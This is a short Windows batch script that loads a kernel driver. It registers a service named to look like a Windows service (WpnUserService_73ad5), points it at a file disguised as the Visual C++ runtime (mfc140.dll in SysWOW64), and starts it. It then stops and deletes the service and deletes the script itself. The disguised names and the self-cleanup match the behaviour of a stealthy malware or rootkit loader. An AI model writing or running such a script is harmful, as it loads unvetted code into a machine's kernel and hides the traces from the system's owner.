@echo off
cd %~dp0
sc create WpnUserService_73ad5 binpath=C:\Windows\SysWOW64\mfc140.dll type=kernel
sc start WpnUserService_73ad5
sc stop WpnUserService_73ad5
sc delete WpnUserService_73ad5
del "%~f0"



